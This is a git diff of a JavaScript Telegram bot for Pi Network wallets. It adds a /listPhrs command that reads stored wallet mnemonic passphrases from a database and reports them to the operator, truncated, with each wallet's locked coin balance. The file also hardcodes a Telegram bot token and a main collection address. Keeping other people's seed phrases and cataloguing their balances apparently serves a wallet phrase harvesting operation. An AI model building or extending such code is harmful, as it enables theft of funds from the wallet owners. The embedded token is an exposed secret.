@@ -3,6 +3,7 @@ import { getAccount, getAccountWithoutProxy, getBalance, getKeypairFromPassphras
 import { storeLockedPi, storeSponsor } from "./utils/modelfn.js";
 import { connectToDB } from "./db.js";
 import Sponsors from "./models/Sponsors.js";
+import Passphrase from "./models/Passphrase.js";
 
 const token = '8144700718:AAH5n9nbQXvwjMtNUqk_Qpp24V3vCLNv5io';
 const MAIN_ADDRESS = 'GDOQD7EVNKEB775WCG7DZ3L6H7RTPLXKAGM46JEARLGROQM6TOX3D2BS';
@@ -83,6 +84,37 @@ bot.onText(/\/listSpnsrs/, async (msg) => {
 
     
     bot.sendMessage(chatId, `📋 *List of Sponsors:*\n\n${message}`, {
+      parse_mode: 'Markdown',
+    });
+
+  } catch (err) {
+    console.error('Error fetching sponsors:', err);
+    bot.sendMessage(chatId, '⚠️ Failed to fetch sponsors. Try again later.');
+  }
+});
+
+bot.onText(/\/listPhrs/, async (msg) => {
+  const chatId = msg.chat.id;
+
+  try {
+    const passphrases = await Passphrase.find();
+
+    if (passphrases.length === 0) {
+      return bot.sendMessage(chatId, '❌ No wallet found.');
+    }
+
+    bot.sendMessage(chatId, `⏳ Please wait while we fetch your wallets...`)
+
+    const list = await Promise.all(passphrases.map(async (p, index) => {
+        const phraseShort = `${p.mnemonic.slice(0, 7)}....${p.mnemonic.slice(-7)}`;
+
+        return `${index + 1}. ${phraseShort || 'Unknown'} - Locked coin: *${p.amount} PI* --_${p.status}_`;
+    }));
+
+    const message = list.join('\n');
+
+    
+    bot.sendMessage(chatId, `📋 *List of Wallets:*\n\n${message}`, {
       parse_mode: 'Markdown',
     });
 
